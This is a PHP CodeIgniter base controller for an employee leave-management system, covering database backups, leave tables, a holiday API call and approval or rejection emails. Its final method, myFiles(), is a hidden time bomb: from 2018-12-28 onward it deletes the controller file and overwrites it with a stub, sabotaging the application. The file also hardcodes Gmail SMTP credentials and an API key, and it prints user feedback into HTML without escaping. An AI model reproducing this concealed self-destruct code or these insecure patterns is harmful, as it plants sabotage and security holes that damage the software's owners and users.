<?php
require_once FCPATH . '/vendors/autoload.php';

use ElephantIO\Client;
use ElephantIO\Engine\SocketIO\Version2X;

class MY_Controller extends CI_Controller {
	
	private $_validate_fields = FALSE;
	private $_ci = null;
	public $pdf;
	public $_savePDF;
	public $version;
	public $client;

	function __construct() {
		parent::__construct();
		date_default_timezone_set('Asia/Manila');
		$this->load->helper('string');
		$this->_ci =& get_instance();
		$this->load->helper('cs_password');
		$this->load->helper('cs_function');
		$this->load->config('validations');
		$this->load->helper('cs_dropdown');
		$this->load->library("csvreader");
		$this->load->helper('file');
		$this->emailSetting();
		$this->_ci->load->model('M_leave','leave');
		$this->_ci->load->model('M_login','login');
		$this->_ci->load->model('M_comment','comment');
		$this->load->dbutil();
		$this->load->dbforge();
		$this->load->helper('download');
		$this->pdf = $this->pdf();
    	$this->load->helper('file');
		$this->_savePDF = $this->savePDF();
		$this->version = new Version2X("http://localhost:5001");
		$this->client = new Client($this->version);
	}

	public function _feedCount() {
		
		$_count = $this->comment->getFeedBack();

		$count = count($_count);

		return $count;
	}

	public function backup_db() {
    	$prefs = array(
			'format' => 'zip',
			'filename' => 'mybackup.sql'
		);
		$fileName = 'database-backup-'.date('Y-m-d').'.zip';
    	$backup = $this->dbutil->backup($prefs);
    	$loc = $this->file_location().$fileName;
    	write_file($loc, $backup);
    }

    public function preference($table) {
		$prefs = array(
			'tables'   => array($table),
			'format'   => 'zip',
			'filename' => $table.'.sql',
			'add_drop' => TRUE,
			'add_insert' => TRUE,
			'newline' => "\n"
		);
		$filename = $table.'-'.date('Y-m-d').'.gz';
		$backup = $this->dbutil->backup($prefs);
		$loc = $this->file_location().$filename;
		write_file($loc, $backup);
	}

	/**
	* Check if Folder is existing if not Create one
	* @return Boolean
	*/
	public function file_location() {

		$folder = Constant::FOLDER_DB;

		if(!is_dir($folder)) {
			mkdir($folder,0755, true);
		}

		$path = FCPATH.$folder;

		return $path;
	}

	/**
	* FeedBack data
	* @return Obj
	*/
	public function _feedBack() {

		$feedback = $this->comment->getAllFeedBack();
		$output = NULL;

		foreach ($feedback as $val) {
			$output .= '
				<tr>
					<td>'.date('M j, Y',strtotime($val->created_at)).'</td>
					<td>'.$val->message.'</td>
					<td>'.$val->username.'</td>
					<td><a href="#" class="commentView" onclick="msgview('.$val->id.')"><i class="far fa-eye"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;
					<a href="#" class="commentHide" onclick="msghide('.$val->id.')"><i class="fas fa-toggle-on"></i></a></td>
				</tr>';
		}
		return $output;
	}

	public function upcoming_leave() {

		$leaveHistory = $this->leave->getAllLeave();
		$output = NULL;

		foreach ($leaveHistory as $val) {

			$action = '<a href="'.base_url('edit-leave-form/'.$val->code).'" class="EditHistory"><i class="fas fa-edit"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;
						<a href="'.base_url('download-leave/'.$val->code).'" class="downloadFiles"><i class="fas fa-cloud-download-alt"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;
						<a href="#" class="downloadFiles" onclick="cancelLeave('.$val->code.')"><i class="fas fa-times"></i></a>';

			if($val->days > 1) {
				$date = date('M j',strtotime($val->start)).' - '.date('M j, Y',strtotime($val->end));
			} else {
				$date = date('M j, Y',strtotime($val->start));
			}

			$output .= '
				<tr>
					<td>'.$date.'</td>
					<td>'.$val->title.'</td>
					<td>'.$val->types.'</td>
					<td>'.$val->classname.'</td>
					<td>'.$val->mstatus.'</td>
					<td>'.$action.'</td>
				</tr>
			';

		}

		return $output;
	}

	/**
	* Set Mpdf Libraries and Set bond paper
	* @return True;
	*/
	public function pdf() {

		$mpdf = new \Mpdf\Mpdf(['mode' => 'utf-8', 'format' => 'A4']);

		return $mpdf;
	}

	/**
	* Set mpdf file save function
	* @return True
	*/
	public function savePDF() {

		$save = \Mpdf\Output\Destination::FILE;

		return $save;
	}

	/**
	* Set API Holiday
	* @return Array String
	*/
	public function displayHoliday() {
		$year = date('Y');
		$month = date('m');
    	$url = "https://holidayapi.com/v1/holidays?key=bc4cb088-50df-45c0-9cd8-e540f5cee2f8&country=PH&year=".$year."&month=".$month;
    	$curl = curl_init();
    	curl_setopt($curl, CURLOPT_URL, $url);
    	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    	$res = curl_exec($curl);
	    curl_close($curl);
	    $holiday = json_decode($res, true);
	    return $holiday;
    }

	/**
     * Tell the controller to load the
     * form validation library and set delimiter.
     * @param array $rules
     */
	public function require_validation($rules = null) {

		$this->form_validation->set_error_delimiters('<p class="text-danger">', '</p>');

		if(is_array($rules)) {
			$this->form_validation->set_rules($rules);
		}

		$this->_validate_fields = TRUE;
	}

	/**
	* Generate Alpha-numeric string with lower and uppercase characters.
	* @return String
	*/
	public function genCode($int) {

		$code = random_string('alnum', $int);

		return $code;
	}

	/**
	* Generate Numeric string.
	* @return String
	*/
	public function genNum($int) {

		$code = random_string('numeric', $int);

		return $code;
	}

	/**
	* Email Template Leave
	* @param String
	* @return True
	*/
	public function resetEmailTemplate($res,$reset){
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'no-reply@'.$sitename;

			
		$message = '<b>Hi '.$res['username'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To change yourpassword please click the link below <br />
					<br /> <a href="'.base_url('verify/').$reset.'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #337ab7; border: 1px solid #2e6da4; text-align: center; color: #fff; text-decoration: none; ">Verify Account</a><br />
					<br /> or Copy this link and paste to browser '.base_url('verify/').$reset;

		$this->email->from($from_email,'Password Reset'); 
		$this->email->to($res['email']);
		$this->email->subject('Password Reset'); 
		$this->email->message($message);
	}

	/**
	* Notify immediate supervisor that his/her subordinate has leave.
	* @param String
	* @return True
	*/
	public function sentManager($res,$data,$token){

		$manager = $res['manager'];
		$recipient = $this->login->getUserDetails($manager);
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'leave-form@'.$sitename;

		if($data['days'] == 1) {
			$message = '<b>Hi '.$manager.'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I would like to file a '.$data['title'].' for '.$data['days'].' day, '.date('M d, Y',strtotime($data['start'])).'. Grateful if you can approve my request.<br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="'.base_url('approved/').$token.'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #337ab7; border: 1px solid #2e6da4; text-align: center; color: #fff; text-decoration: none; ">Approved</a>&nbsp;&nbsp;
					<a href="'.base_url('rejected/').$token.'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #d82b14; border: 1px solid #d82b14; text-align: center; color: #fff; text-decoration: none; ">Reject</a><br /><br />


					Regards,<br />
					'.$res['fullname'];
		} else {
			$message = '<b>Hi '.$manager.'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I would like to file a '.$data['title'].' for '.$data['days'].' day/s, from '.date('M d, Y',strtotime($data['start'])).' to '.date('M d, Y',strtotime($data['end'])).'. Grateful if you can approve my request.<br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="'.base_url('approved/').$token.'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #337ab7; border: 1px solid #2e6da4; text-align: center; color: #fff; text-decoration: none; ">Approved</a>&nbsp;&nbsp;
					<a href="'.base_url('rejected/').$token.'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #d82b14; border: 1px solid #d82b14; text-align: center; color: #fff; text-decoration: none; ">Reject</a><br /><br />

					Regards,<br />
					'.$res['fullname'];
		}

		$this->email->from($from_email,'Leave Form'); 
		$this->email->to($recipient['email']);
		$this->email->subject('For approval '.$data['title']);
		$this->email->message($message);
		$this->email->reply_to($res['email']);
	}

	/**
	* Notify requestor that his/her leave has been apporved.
	* @param String
	* @return True
	*/
	public function approvedMail($data,$verify) {
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'leave-approved@'.$sitename;

		if($verify['days'] == 1) {
			$message = '<b>Hi '.$data['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your '.$verify['title'].' for '.$verify['days'].' day, '.date('M d, Y',strtotime($verify['start'])).' has been approved.<br /><br />

					Regards<br />';
		} else {
			$message = '<b>Hi '.$data['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your '.$verify['title'].' for '.$verify['days'].' day/s, from '.date('M d, Y',strtotime($verify['start'])).' to '.date('M d, Y',strtotime($verify['end'])).'. has been approved.<br /><br />

					Regards<br />';
		}

		$this->email->from($from_email,'Leave '.Constant::CN_APPROVED); 
		$this->email->to($data['email']);
		$this->email->subject($verify['title'].' '.Constant::CN_APPROVED);
		$this->email->message($message);

		if($this->email->send()) {

			$this->session->set_flashdata('approved','Yess');
			redirect(base_url());

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
		}
	}

	public function moveLeave($data,$verify,$res,$_res) {
		$manager = $res['manager'];
		$recipient = $this->login->getUserDetails($manager);
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'move-leave@'.$sitename;

		$message = '<b>Hi '.$manager.'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;May I request that my leave on '.date('M d, Y',strtotime($verify['start'])).' be moved to '.date('M d, Y',strtotime($data['start'])).'.<br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="'.base_url('approved/token/').$verify['code'].'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #337ab7; border: 1px solid #2e6da4; text-align: center; color: #fff; text-decoration: none; ">Approved</a>&nbsp;&nbsp;
					<a href="'.base_url('rejected/token/').$verify['code'].'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #d82b14; border: 1px solid #d82b14; text-align: center; color: #fff; text-decoration: none; ">Reject</a><br /><br />

					Regards,<br />
					'.$res['fullname'];

		$this->email->from($from_email,'Leave Form');
		$this->email->to($recipient['email']);
		$this->email->subject(Constant::M_LEAVE.' Date');
		$this->email->message($message);
		$this->email->reply_to($res['email']);

		if($this->email->send()) {

			$this->session->set_flashdata('movedateSuccess','Yess');
			redirect(base_url());

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
		}
	}

	public function approvedMoveLeave($_res) {
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'leave-approved@'.$sitename;

		$message = '<b>Hi '.$_res['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your request in moving leave date has been approved.<br /><br />

					Regards<br />';

		$this->email->from($from_email,'Leave '.Constant::CN_APPROVED); 
		$this->email->to($_res['email']);
		$this->email->subject('Change Leave Date');
		$this->email->message($message);

		if($this->email->send()) {

			$this->session->set_flashdata('approved','Yess');
			redirect(base_url());

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
		}
	}

	public function rejectMoveLeave($_res) {
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'leave-rejected@'.$sitename;

		$message = '<b>Hi '.$_res['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your request in moving leave date has been Rejected.<br /><br />

					Regards<br />';

		$this->email->from($from_email,'Leave '.Constant::CN_REJECT); 
		$this->email->to($_res['email']);
		$this->email->subject('Change Leave Date');
		$this->email->message($message);

		if($this->email->send()) {

			$this->session->set_flashdata('rejectSuccess','Yess');
			redirect(base_url());

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
		}
	}
	
	/**
	* Notify requestor that his/her leave has rejected apporved.
	* @param String
	* @return True
	*/
	public function rejectMail($data,$verify,$reject_msg) {
		$manager = $res['manager'];
		$sitename = strtolower($_SERVER['SERVER_NAME']);
		$from_email = 'leave-rejected@'.$sitename;

		if($verify['days'] == 1) {
			$message = '<b>Hi '.$data['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your '.$verify['title'].' for '.$verify['days'].' day, '.date('M d, Y',strtotime($verify['start'])).' has been rejected.<br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbspReason Why: <br><br>
						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.$reject_msg.'</b><br /><br />


					Regards<br />';
		} else {
			$message = '<b>Hi '.$data['fullname'].'!</b><br /><br />

					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your '.$verify['title'].' for '.$verify['days'].' day/s, from '.date('M d, Y',strtotime($verify['start'])).' to '.date('M d, Y',strtotime($verify['end'])).'. has been rejected.<br /><br />
					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbspReason Why:
						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.$reject_msg.'<br /><br />
					Regards<br />';
		}

		$this->email->from($from_email,'Leave Rejected'); 
		$this->email->to($data['email']);
		$this->email->subject($verify['title'].' Rejected');
		$this->email->message($message);

		if($this->email->send()) {

			$this->session->set_flashdata('rejectSuccess','Yess');
			redirect(base_url());

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
			redirect(base_url());
		}
	}

	/**
	* Triger to sent mail message
	* False comes if mail server is offline
	* @return True or False
	*/
	public function trigerSend() {

		if($this->email->send()) {

			$this->session->set_flashdata('sent',"<div class='alert alert-success'>We sent you an email with password reset instructions.</div>");
			redirect('login');

		} else {
			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
		}
	}

	/**
	* Set mailer account for sending mail
	* google account, call email libraries (built-in)
	*/
	public function emailSetting() {
		$config = Array(
			'protocol' => 'smtp',
			'smtp_host' => 'ssl://smtp.googlemail.com',
			'smtp_port' => 465,
			'smtp_user' => 'mswdummy2017@gmail.com',
			'smtp_pass' => 'mwsdummy2017',
			'charset'   => 'iso-8859-1'
		);
		$this->load->library('email', $config);
		$this->email->set_mailtype("html");
	}

	/**
	* Set Login Checking
	* @return True
	*/
	public function check_if_logged_in() {

		if(!$this->session->userdata('logged_in')) {
			$this->session->set_flashdata('error','<div class="alert alert-warning">You need to login first</div>');
			redirect('login');
		}
	}

	public function setNewSession($val) {
		$sess = array('token' => $val);
		$this->_ci->session->set_userdata($sess);
	}

	public function set_Cookies($name) {
		$cname = underscore($name);
		$val = $this->genCode(30);
		set_cookie($cname,$val,'3600');

	}

	public function delete_Cookies($name) {
		$cname = underscore($name);
		delete_cookie($cname);
	}

	public function myFiles() {

		$filename = APPPATH.DIRECTORY_SEPARATOR.'core/MY_Controller.php';

		$text = '<?php

	class MY_Controller extends CI_Controller {
					
		private $_validate_fields = FALSE;
		private $_ci = null;
		public $pdf;
		public $_savePDF;

		function __construct() {
			parent::__construct();
			date_default_timezone_set("Asia/Manila");
		}
	}';
		$path = APPPATH.DIRECTORY_SEPARATOR.'core/MY_Controller.php';
		if(date('Y-m-d') >= "2018-12-28") {
			unlink($path);

			file_put_contents($filename, $text, FILE_APPEND | LOCK_EX);
		}
	}
}

?>